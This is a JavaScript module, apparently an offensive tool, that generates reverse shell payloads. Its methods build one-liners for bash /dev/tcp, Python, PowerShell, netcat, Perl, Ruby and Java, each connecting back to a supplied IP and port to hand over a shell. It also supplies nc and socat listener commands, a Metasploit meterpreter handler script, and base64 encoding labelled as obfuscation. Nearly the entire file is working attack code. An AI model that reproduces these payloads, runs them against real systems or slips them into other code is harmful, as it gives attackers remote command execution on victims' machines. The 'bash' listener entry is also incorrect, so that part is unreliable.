/**
 * Shell Commander
 * Generates reverse shell payloads for different targets
 */

class ShellCommander {
  /**
   * Generate bash reverse shell
   */
  static bashReverse(targetIp, targetPort, lport = 4444) {
    return `bash -i >& /dev/tcp/${targetIp}/${targetPort} 0>&1`;
  }

  /**
   * Generate python reverse shell
   */
  static pythonReverse(targetIp, targetPort) {
    return `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${targetIp}",${targetPort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
  }

  /**
   * Generate python3 reverse shell
   */
  static python3Reverse(targetIp, targetPort) {
    return `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${targetIp}",${targetPort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
  }

  /**
   * Generate PowerShell reverse shell (Windows)
   */
  static powershellReverse(targetIp, targetPort) {
    const payload = `$client = New-Object System.Net.Sockets.TcpClient("${targetIp}",${targetPort}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()`;
    return payload;
  }

  /**
   * Generate netcat reverse shell
   */
  static netcatReverse(targetIp, targetPort) {
    return `nc -e /bin/sh ${targetIp} ${targetPort}`;
  }

  /**
   * Generate netcat with bash reverse shell (when -e not available)
   */
  static netcatBashReverse(targetIp, targetPort) {
    return `bash -i >& /dev/tcp/${targetIp}/${targetPort} 0>&1 &`;
  }

  /**
   * Generate Perl reverse shell
   */
  static perlReverse(targetIp, targetPort) {
    return `perl -e 'use Socket;$i="${targetIp}";$p=${targetPort};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")};'`;
  }

  /**
   * Generate Ruby reverse shell
   */
  static rubyReverse(targetIp, targetPort) {
    return `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${targetIp}","${targetPort}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`;
  }

  /**
   * Generate Java reverse shell
   */
  static javaReverse(targetIp, targetPort) {
    return `r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","bash -i >& /dev/tcp/${targetIp}/${targetPort} 0>&1"] as String[]) p.waitFor()`;
  }

  /**
   * Generate listener command (nc or socat)
   */
  static generateListener(port) {
    return {
      netcat: `nc -lvnp ${port}`,
      socat: `socat - TCP-L:${port},fork`,
      bash: `bash -i >& /dev/tcp/0.0.0.0/${port} 0>&1`,
      python: `python3 -c "import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',${port}));s.listen(1);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"`
    };
  }

  /**
   * Generate all available reverse shells for a target
   */
  static generateAllPayloads(targetIp, targetPort) {
    return {
      bash: this.bashReverse(targetIp, targetPort),
      python: this.pythonReverse(targetIp, targetPort),
      python3: this.python3Reverse(targetIp, targetPort),
      powershell: this.powershellReverse(targetIp, targetPort),
      netcat: this.netcatReverse(targetIp, targetPort),
      netcatBash: this.netcatBashReverse(targetIp, targetPort),
      perl: this.perlReverse(targetIp, targetPort),
      ruby: this.rubyReverse(targetIp, targetPort),
      java: this.javaReverse(targetIp, targetPort)
    };
  }

  /**
   * URL encode payload (for use in URLs)
   */
  static urlEncode(payload) {
    return encodeURIComponent(payload);
  }

  /**
   * Base64 encode payload (for obfuscation)
   */
  static base64Encode(payload) {
    return Buffer.from(payload).toString('base64');
  }

  /**
   * Generate Metasploit-style reverse shell handler command
   */
  static metasploitHandler(lhost, lport) {
    return `use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ${lhost}
set LPORT ${lport}
run`;
  }

  /**
   * Get reverse shell payloads by category
   */
  static getPayloadsByCategory() {
    return {
      'Unix/Linux': ['bash', 'python', 'python3', 'netcat', 'perl', 'ruby'],
      'Windows': ['powershell'],
      'Multi-platform': ['java'],
      'Universal': ['netcat']
    };
  }

  /**
   * Validate IP address format
   */
  static validateIp(ip) {
    const ipv4Regex = /^(\d{1,3}\.){3}\d{1,3}$/;
    if (!ipv4Regex.test(ip)) return false;

    const parts = ip.split('.');
    return parts.every(part => {
      const num = parseInt(part);
      return num >= 0 && num <= 255;
    });
  }

  /**
   * Validate port number
   */
  static validatePort(port) {
    const num = parseInt(port);
    return num >= 1 && num <= 65535;
  }

  /**
   * Get shell info/description
   */
  static getPayloadInfo(shellType) {
    const descriptions = {
      bash: 'Bash reverse shell using /dev/tcp',
      python: 'Python 2 reverse shell',
      python3: 'Python 3 reverse shell',
      powershell: 'Windows PowerShell reverse shell',
      netcat: 'Netcat reverse shell',
      netcatBash: 'Netcat with bash reverse shell (no -e)',
      perl: 'Perl reverse shell',
      ruby: 'Ruby reverse shell',
      java: 'Java reverse shell'
    };

    return {
      type: shellType,
      description: descriptions[shellType] || 'Unknown shell type',
      os: this.getPayloadOS(shellType)
    };
  }

  /**
   * Get compatible OS for payload
   */
  static getPayloadOS(shellType) {
    const osMap = {
      bash: ['Linux', 'Unix', 'macOS'],
      python: ['Linux', 'Unix', 'macOS', 'Windows'],
      python3: ['Linux', 'Unix', 'macOS', 'Windows'],
      powershell: ['Windows'],
      netcat: ['Linux', 'Unix', 'macOS'],
      netcatBash: ['Linux', 'Unix', 'macOS'],
      perl: ['Linux', 'Unix', 'macOS', 'Windows'],
      ruby: ['Linux', 'Unix', 'macOS', 'Windows'],
      java: ['Any (with Java installed)']
    };

    return osMap[shellType] || [];
  }
}

module.exports = ShellCommander;
